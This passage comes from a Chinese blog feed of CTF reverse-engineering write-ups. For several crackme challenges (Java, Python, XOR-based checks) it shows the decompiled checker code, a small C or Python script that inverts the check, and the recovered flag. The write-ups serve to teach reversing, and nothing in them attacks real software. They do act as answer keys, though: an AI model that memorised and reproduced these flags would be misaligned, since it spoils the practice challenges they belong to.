b[]&#x3D;&#123;188,155,11,58,251,208,204,202,150,120,206,237,114,92,126,6,42&#125;;</span><br><span class="line">    int c[]&#x3D;&#123;53,222,230,35,67,248,226,216,17,209,32,2,181,200,171,60,108&#125;;</span><br><span class="line">    char flag[17];</span><br><span class="line">    for(i&#x3D;0;i&lt;17;i++)</span><br><span class="line">    &#123;</span><br><span class="line">    flag[i]&#x3D;a[i + c[i]]-b[i] &amp; 255;</span><br><span class="line">&#125;</span><br><span class="line">for(i&#x3D;16;i&gt;&#x3D;0;i--)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;%c&quot;,flag[i]);</span><br><span class="line">&#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面这个是python的，比用C语言写简单多了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">lookup &#x3D; [196,153, 149,206, 17,221, 10, 217, 167, 18, 36, 135, 103, 61, 111, 31, 92, 152, </span><br><span class="line">21, 228, 105, 191, 173, 41, 2, 245, 23, 144, 1, 246, 89, 178, 182, 119, 38, 85, 48, 226, </span><br><span class="line">165, 241, 166, 214, 71, 90, 151, 3, 109, 169, 150, 224, 69, 156, 158, 57, 181, 29, 200, 37, </span><br><span class="line">51, 252, 227, 93, 65, 82, 66, 80, 170, 77, 49, 177, 81, 94, 202, 107, 25, 73, 148, 98, 129, </span><br><span class="line">231, 212, 14, 84, 121, 174, 171, 64, 180, 233, 74, 140, 242, 75, 104, 253, 44, 39, 87, 86, </span><br><span class="line">27, 68, 22, 55, 76, 35, 248, 96, 5, 56, 20, 161, 213, 238, 220, 72, 100, 247, 8, 63, 249, </span><br><span class="line">145, 243, 155, 222, 122, 32, 43, 186, 0, 102, 216, 126, 15, 42, 115, 138, 240, 147, 229, </span><br><span class="line">204, 117, 223, 141, 159, 131, 232, 124, 254, 60, 116, 46, 113, 79, 16, 128, 6, 251, 40, </span><br><span class="line">205, 137, 199, 83, 54, 188, 19, 184, 201, 110, 255, 26, 91, 211, 132, 160, 168, 154, 185, </span><br><span class="line">183, 244, 78, 33, 123, 28, 59, 12, 210, 218, 47, 163, 215, 209, 108, 235, 237, 118, 101, </span><br><span class="line">24, 234, 106, 143, 88, 9, 136, 95, 30, 193, 176, 225, 198, 197, 194, 239, 134, 162, 192, </span><br><span class="line">11, 70, 58, 187, 50, 67, 236, 230, 13, 99, 190, 208, 207, 7, 53, 219, 203, 62, 114, 127, </span><br><span class="line">125, 164, 179, 175, 112, 172, 250, 133, 130, 52, 189, 97, 146, 34, 157, 120, 195, 45, 4, </span><br><span class="line">142, 139]</span><br><span class="line">pwda &#x3D; [188,155,11,58,251,208,204,202,150,120,206,237,114,92,126,6,42]</span><br><span class="line">pwdb &#x3D; [53,222,230,35,67,248,226,216,17,209,32,2,181,200,171,60,108]</span><br><span class="line">flag&#x3D;&quot;&quot;</span><br><span class="line">for i in range(0,17):</span><br><span class="line">    flag+&#x3D;chr(lookup[i + pwdb[i]]-pwda[i] &amp; 255)</span><br><span class="line">flag&#x3D;flag[::-1]</span><br><span class="line">print (flag)</span><br></pre></td></tr></table></figure><blockquote><p>PCTF{PyC_Cr4ck3r}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Re </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Re-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java逆向</title>
      <link href="2021/03/03/java%E9%80%86%E5%90%91/"/>
      <url>2021/03/03/java%E9%80%86%E5%90%91/</url>
      
        <content type="html"><![CDATA[<h1 id="Java逆向解密"><a href="#Java逆向解密" class="headerlink" title="Java逆向解密"></a>Java逆向解密</h1><a id="more"></a><p><a href="https://buuoj.cn/challenges#Java%E9%80%86%E5%90%91%E8%A7%A3%E5%AF%86">题目链接</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">import java.util.ArrayList;</span><br><span class="line">import java.util.Scanner;</span><br><span class="line"></span><br><span class="line">public class Reverse &#123;</span><br><span class="line"></span><br><span class="line">   public static void main(String[] args) &#123;</span><br><span class="line">      Scanner s &#x3D; new Scanner(System.in);</span><br><span class="line">      System.out.println(&quot;Please input the flag 锛�&quot;);</span><br><span class="line">      String str &#x3D; s.next();</span><br><span class="line">      System.out.println(&quot;Your input is 锛�&quot;);</span><br><span class="line">      System.out.println(str);</span><br><span class="line">      char[] stringArr &#x3D; str.toCharArray();</span><br><span class="line">      Encrypt(stringArr);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   public static void Encrypt(char[] arr) &#123;</span><br><span class="line">      ArrayList Resultlist &#x3D; new ArrayList();</span><br><span class="line"></span><br><span class="line">      for(int KEY &#x3D; 0; KEY &lt; arr.length; ++KEY) &#123;</span><br><span class="line">         int KEYList &#x3D; arr[KEY] + 64 ^ 32;</span><br><span class="line">         Resultlist.add(Integer.valueOf(KEYList));</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      int[] var5 &#x3D; new int[]&#123;180, 136, 137, 147, 191, 137, 147, 191, 148, 136, 133, 191, </span><br><span class="line">         134, 140, 129, 135, 191, 65&#125;;</span><br><span class="line">      ArrayList var6 &#x3D; new ArrayList();</span><br><span class="line"></span><br><span class="line">      for(int j &#x3D; 0; j &lt; var5.length; ++j) &#123;</span><br><span class="line">         var6.add(Integer.valueOf(var5[j]));</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      System.out.println(&quot;Result:&quot;);</span><br><span class="line">      if(Resultlist.equals(var6)) &#123;</span><br><span class="line">         System.out.println(&quot;Congratulations锛�&quot;);</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">         System.err.println(&quot;Error锛�&quot;);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很清晰的逻辑，直接写脚本。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    int i;</span><br><span class="line">    int a[18]&#x3D;&#123;180, 136, 137, 147, 191, 137, 147, 191, 148, 136, 133, 191, 134, 140, 129, </span><br><span class="line">      135, 191, 65&#125;;</span><br><span class="line">    for(i&#x3D;0;i&lt;18;i++)</span><br><span class="line">    &#123;</span><br><span class="line">    a[i]&#x3D;a[i]-64 ^ 32;</span><br><span class="line">printf(&quot;%c&quot;,a[i]); </span><br><span class="line">&#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>flag{This_is_the_flag_!}</p></blockquote><h1 id="Wust"><a href="#Wust" class="headerlink" title="Wust"></a>Wust</h1><p><a href="https://pan.baidu.com/s/11OVxyzhLx9z0A1pMTdYLxw">附件链接</a> 提取码：0000</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line">public class Wust &#123;</span><br><span class="line"></span><br><span class="line">   public static void main(String[] args) &#123;</span><br><span class="line">      System.out.println(&quot;WUSTCTF2021 Freshman competition&quot;);</span><br><span class="line">      System.out.println(&quot;Input your flag:&quot;);</span><br><span class="line">      BufferedReader br &#x3D; new BufferedReader(new InputStreamReader(System.in));</span><br><span class="line">      String str &#x3D; null;</span><br><span class="line">      int[] flag &#x3D; new int[]&#123;60, 23, 23, 41, 110, 66, 44, 17, 126, 68, 43, 26, 113, 71, 10&#125;;</span><br><span class="line"></span><br><span class="line">      try &#123;</span><br><span class="line">         str &#x3D; br.readLine();</span><br><span class="line">      &#125; catch (Exception var10) &#123;</span><br><span class="line">         System.out.println(&quot;ERROR: Undefined Exception.&quot;);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      if(str.isEmpty()) &#123;</span><br><span class="line">         System.out.println(&quot;Nothing received.&quot;);</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">         if(str.length() !&#x3D; 22) &#123;</span><br><span class="line">            System.out.println(&quot;len Wrong!&quot;);</span><br><span class="line">            return;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         String head &#x3D; str.substring(0, 5);</span><br><span class="line">         if(!head.equals(&quot;flag&#123;&quot;)) &#123;</span><br><span class="line">            System.out.println(&quot;head Wrong!&quot;);</span><br><span class="line">            return;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         String m &#x3D; str.substring(5, str.length() - 1);</span><br><span class="line"></span><br><span class="line">         for(int i &#x3D; 0; i &lt; m.length() - 1; ++i) &#123;</span><br><span class="line">            char a &#x3D; m.charAt(i);</span><br><span class="line">            char b &#x3D; m.charAt(i + 1);</span><br><span class="line">            int c &#x3D; a ^ b;</span><br><span class="line">            if(c !&#x3D; flag[i]) &#123;</span><br><span class="line">               System.out.println(&quot;Wrong!&quot;);</span><br><span class="line">               return;</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         System.out.println(&quot;Congratulations!&quot;);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个就是输入flag，flag[2]=flag[1]^60,flag[3]=glag[2]^23,以此类推。<br>众所周知，大部分flag都是有意义的一串字符，这里我采用了穷举。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">int i,j;</span><br><span class="line">int s[16];</span><br><span class="line">int f[15]&#x3D;&#123;60, 23, 23, 41, 110, 66, 44, 17, 126, 68, 43, 26, 113, 71, 10&#125;;</span><br><span class="line">for(i&#x3D;32;i&lt;127;i++)</span><br><span class="line">&#123;</span><br><span class="line">s[0]&#x3D;i;</span><br><span class="line">for(j&#x3D;0;j&lt;15;j++)</span><br><span class="line">&#123;</span><br><span class="line">s[j+1]&#x3D;f[j]^s[j];</span><br><span class="line">&#125;</span><br><span class="line">for(j&#x3D;0;j&lt;16;j++)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;%c&quot;,s[j]);</span><br><span class="line">&#125;</span><br><span class="line">printf(&quot;\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>flag{Jvav_1s_N0t_E4sy}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Re </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Re-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python逆向</title>
      <link href="2021/03/03/python%E9%80%86%E5%90%91/"/>
      <url>2021/03/03/python%E9%80%86%E5%90%91/</url>
      
        <content type="html"><![CDATA[<h1 id="test"><a href="#test" class="headerlink" title="test"></a>test</h1><a id="more"></a><p><a href="https://pan.baidu.com/s/1DGgkAlcAH1QP1LROT60Ipg">附件链接</a> 提取码：0000</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from libnum import *</span><br><span class="line">ans &#x3D; 0x6675FA7F228DBCEB6A2DC223A37FC64FE67E61L</span><br><span class="line">flag &#x3D; s2n(input(&#39;Input your flag: &#39;))</span><br><span class="line">flag ^&#x3D; flag &gt;&gt; 10</span><br><span class="line">if flag &#x3D;&#x3D; ans:</span><br><span class="line">    print(&#39;You are right!&#39;)</span><br><span class="line">else:</span><br><span class="line">    print(&#39;Try again!&#39;)</span><br></pre></td></tr></table></figure><p>flag的前十位与ans的前十位相同，flag的11-20位是flag1-10位与ans的11-20位异或的结果，以下为脚本。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">int ans[151]&#x3D;&#123;1,1,0,0,1,1,0,0,1,1,1,0,1,0,1,1,1,1,1,1,0,1,0,0,1,1,1,1,1,1,1,0,0,1,0,0,0,</span><br><span class="line">1,0,1,0,0,0,1,1,0,1,1,0,1,1,1,1,0,</span><br><span class="line">0,1,1,1,0,1,0,1,1,0,1,1,0,1,0,1,0,0,0,1,0,1,1,0,1,1,1,0,0,0,0,1,0,0,0,1,0,0,0,1,1,1,0,1,</span><br><span class="line">0,0,0,1,1,0,1,1,1,1,1,1,1,1,1,0,0,</span><br><span class="line">0,1,1,0,0,1,0,0,1,1,1,1,1,1,1,0,0,1,1,0,0,1,1,1,1,1,1,0,0,1,1,0,0,0,0,1&#125;;</span><br><span class="line">int flag[151];</span><br><span class="line">int i,k,j&#x3D;10;</span><br><span class="line">for(i&#x3D;0;i&lt;10;i++)</span><br><span class="line">&#123;</span><br><span class="line">flag[i]&#x3D;ans[i];</span><br><span class="line">printf(&quot;%d&quot;,flag[i]);</span><br><span class="line">&#125;</span><br><span class="line">for(k&#x3D;0;k&lt;14;k++)</span><br><span class="line">&#123;</span><br><span class="line">for(i&#x3D;j;i&lt;j+10;i++)</span><br><span class="line">&#123;</span><br><span class="line">flag[i]&#x3D;ans[i]^flag[i-10];</span><br><span class="line">printf(&quot;%d&quot;,flag[i]);</span><br><span class="line">&#125;</span><br><span class="line">j&#x3D;j+10;</span><br><span class="line">&#125;</span><br><span class="line">flag[151]&#x3D;flag[141]^ans[151];</span><br><span class="line">printf(&quot;%d&quot;,flag[151]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果为2进制，转16进制再转字符串。</p><blockquote><p>flag{Sh1ft_4nd_X0r}</p></blockquote><h1 id="pyre"><a href="#pyre" class="headerlink" title="pyre"></a>pyre</h1><p><a href="https://buuoj.cn/challenges#[GWCTF%202019]pyre">题目链接</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">print &#39;Welcome to Re World!&#39;</span><br><span class="line">print &#39;Your input1 is your flag~&#39;</span><br><span class="line">l &#x3D; len(input1)</span><br><span class="line">for i in range(l):</span><br><span class="line">    num &#x3D; ((input1[i] + i) % 128 + 128) % 128</span><br><span class="line">    code +&#x3D; num</span><br><span class="line"></span><br><span class="line">for i in range(l - 1):</span><br><span class="line">    code[i] &#x3D; code[i] ^ code[i + 1]</span><br><span class="line"></span><br><span class="line">print code</span><br><span class="line">code &#x3D; [</span><br><span class="line">    &#39;\x1f&#39;,</span><br><span class="line">    &#39;\x12&#39;,</span><br><span class="line">    &#39;\x1d&#39;,</span><br><span class="line">    &#39;(&#39;,</span><br><span class="line">    &#39;0&#39;,</span><br><span class="line">    &#39;4&#39;,</span><br><span class="line">    &#39;\x01&#39;,</span><br><span class="line">    &#39;\x06&#39;,</span><br><span class="line">    &#39;\x14&#39;,</span><br><span class="line">    &#39;4&#39;,</span><br><span class="line">    &#39;,&#39;,</span><br><span class="line">    &#39;\x1b&#39;,</span><br><span class="line">    &#39;U&#39;,</span><br><span class="line">    &#39;?&#39;,</span><br><span class="line">    &#39;o&#39;,</span><br><span class="line">    &#39;6&#39;,</span><br><span class="line">    &#39;*&#39;,</span><br><span class="line">    &#39;:&#39;,</span><br><span class="line">    &#39;\x01&#39;,</span><br><span class="line">    &#39;D&#39;,</span><br><span class="line">    &#39;;&#39;,</span><br><span class="line">    &#39;%&#39;,</span><br><span class="line">    &#39;\x13&#39;]</span><br></pre></td></tr></table></figure><p>第五行其实就是num=input1[i]+i,超过127，就减去128.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    int i,j;</span><br><span class="line">    int code[23]&#x3D;&#123;0x1f,0x12,0x1d,&#39;(&#39;,&#39;0&#39;,&#39;4&#39;,0x01,0x06,0x14,&#39;4&#39;,&#39;,&#39;,0x1b,</span><br><span class="line">    &#39;U&#39;,&#39;?&#39;,&#39;o&#39;,&#39;6&#39;,&#39;*&#39;,&#39;:&#39;,0x01,&#39;D&#39;,&#39;;&#39;,&#39;%&#39;,0x13&#125;;</span><br><span class="line">    for(i&#x3D;21;i&gt;&#x3D;0;i--)</span><br><span class="line">    &#123;</span><br><span class="line">    code[i]&#x3D;code[i]^code[i + 1];</span><br><span class="line">&#125;</span><br><span class="line">for(i&#x3D;0;i&lt;23;i++)</span><br><span class="line">&#123;</span><br><span class="line">code[i]-&#x3D;i;</span><br><span class="line">if(code[i]&lt;0)</span><br><span class="line">    code[i]+&#x3D;128;</span><br><span class="line">printf(&quot;%c&quot;,code[i]);</span><br><span class="line">&#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>flag{Just_Re_1s_Ha66y!}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Re </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Re-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>某不知名网站题目</title>
      <link href="2021/03/02/%E6%9F%90%E4%B8%8D%E7%9F%A5%E5%90%8D%E7%BD%91%E7%AB%99%E9%A2%98%E7%9B%AE/"/>
      <url>2021/03/02/%E6%9F%90%E4%B8%8D%E7%9F%A5%E5%90%8D%E7%BD%91%E7%AB%99%E9%A2%98%E7%9B%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="equations"><a href="#equations" class="headerlink" title="equations"></a>equations</h1><a id="more"></a><p><a href="https://pan.baidu.com/s/1NK0Gtr3oqlk2Jn2mgasROQ">附件链接</a> 提取码：0000<br>题目翻译城中文为方程组<br>放入ida64中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">234923  89 30 21 11 28 97 68 91 36 29 54 38 18 31 27 25 42 93 45 89 80 94 57 68 59 75 74 </span><br><span class="line">47 40 25 68 52 86 81 38 23 90 80 54 66 80 36</span><br><span class="line">233479  65 11 81 65 58 53 86 44 62 39 64 41 93 67 34 30 25 45 76 17 91 47 57 82 26 17 94 </span><br><span class="line">51 21 80 59 26 75 75 25 67 52 23 81 57 79 98</span><br><span class="line">231388  63 83 55 29 57 53 31 99 27 92 85 98 63 80 18 78 79 28 96 16 95 27 25 71 40 89 79 </span><br><span class="line">81 13 85 41 44 50 55 11 32 76 65 20 37 58 27</span><br><span class="line">223405  39 69 44 25 49 15 16 96 35 32 92 95 11 58 31 90 67 72 83 78 15 25 93 96 97 31 58 </span><br><span class="line">59 14 86 36 37 22 75 43 72 13 26 18 64 64 83</span><br><span class="line">234762  94 82 88 51 31 71 44 74 26 46 95 66 54 75 19 72 93 16 85 54 46 87 15 46 74 27 26 </span><br><span class="line">48 83 13 38 94 45 52 24 72 59 71 32 65 24 93</span><br><span class="line">242484  34 75 68 93 79 19 14 76 60 69 73 29 48 61 49 64 98 29 77 81 85 11 87 11 72 63 87 </span><br><span class="line">40 47 48 87 54 88 27 26 67 93 50 79 42 12 32</span><br><span class="line">232356  76 61 21 72 11 93 13 63 15 13 73 49 48 76 52 81 62 78 84 79 95 74 57 21 13 95 15 </span><br><span class="line">93 57 38 89 98 68 69 21 40 20 55 62 29 54 40</span><br><span class="line">239858  98 66 92 23 97 55 72 69 81 41 38 21 56 95 86 39 78 53 65 37 80 56 38 60 94 72 20 </span><br><span class="line">43 50 28 81 63 12 60 32 12 22 86 65 32 76 71</span><br><span class="line">218896  32 15 73 84 27 21 74 21 35 26 85 28 57 91 37 12 67 47 10 74 62 53 73 84 94 46 74 </span><br><span class="line">47 57 40 88 71 13 32 81 95 57 28 13 94 45 34</span><br><span class="line">249026  50 47 34 57 12 34 76 54 79 18 44 73 50 92 51 72 39 91 26 74 97 42 86 79 53 50 62 </span><br><span class="line">14 71 55 87 64 77 62 63 48 27 81 93 85 65 83</span><br><span class="line">222855  92 26 78 74 25 38 64 98 68 71 14 99 92 11 31 29 20 52 17 10 21 37 99 52 66 32 57 </span><br><span class="line">58 25 25 93 54 96 70 18 66 84 27 44 28 52 83</span><br><span class="line">210754  53 39 23 68 62 44 98 17 80 16 63 51 15 49 84 23 97 26 65 35 11 83 43 64 21 39 37 </span><br><span class="line">79 73 61 55 57 58 69 16 10 48 86 80 13 67 32</span><br><span class="line">261049  12 69 82 77 95 22 21 85 79 58 48 83 47 77 64 80 56 35 78 67 46 93 51 75 69 62 44 </span><br><span class="line">11 46 98 37 93 34 53 87 46 85 79 69 81 45 86</span><br><span class="line">254017  51 74 62 62 86 10 49 94 65 50 62 95 48 66 14 84 61 41 89 78 46 60 20 97 32 65 61 </span><br><span class="line">78 57 16 64 97 81 81 76 61 27 46 99 64 35 99</span><br><span class="line">202040  15 47 16 70 28 32 65 82 53 32 29 25 69 96 52 76 22 41 82 91 47 24 55 40 18 19 52 </span><br><span class="line">83 37 51 89 37 27 55 40 82 61 27 26 28 30 73</span><br><span class="line">213614  11 29 51 69 81 96 58 97 36 81 18 62 73 32 72 11 49 61 69 67 54 30 10 70 42 27 19 </span><br><span class="line">11 97 83 27 40 63 12 41 21 84 74 22 19 65 79</span><br><span class="line">246738  76 64 47 17 80 57 93 11 79 98 56 86 23 67 63 11 54 72 80 44 50 61 14 43 80 48 63 </span><br><span class="line">52 99 79 40 64 49 55 52 78 48 60 44 32 85 98</span><br><span class="line">204859  77 34 26 66 87 76 58 39 81 60 83 23 16 62 33 36 85 40 64 78 22 11 81 81 27 12 11 </span><br><span class="line">41 15 19 69 20 26 66 17 87 50 67 47 21 31 81</span><br><span class="line">248644  56 66 51 80 33 73 76 42 13 91 75 90 82 20 15 99 33 18 22 28 39 17 74 54 78 47 61 </span><br><span class="line">68 73 95 60 52 84 11 78 67 82 79 31 94 78 74</span><br><span class="line">227559  24 15 63 20 81 71 50 77 98 71 98 43 57 10 66 53 36 45 44 54 90 22 96 68 98 27 71 </span><br><span class="line">78 37 43 20 50 82 84 19 76 59 27 47 31 19 31</span><br><span class="line">215120  45 66 23 77 41 65 99 35 67 29 63 77 55 36 27 63 43 70 55 11 28 17 77 90 28 57 62 </span><br><span class="line">98 84 96 36 43 30 73 32 25 34 14 91 18 73 26</span><br><span class="line">218244  65 25 41 22 34 46 91 70 35 22 65 60 96 58 76 80 21 62 59 70 51 50 39 14 31 39 79 </span><br><span class="line">49 45 82 74 35 56 24 93 47 32 41 14 15 71 51</span><br><span class="line">229321  45 99 29 14 89 72 48 43 92 10 94 13 33 94 59 22 65 29 23 86 67 83 28 46 83 89 48 </span><br><span class="line">59 28 38 82 32 70 50 28 39 24 60 17 37 60 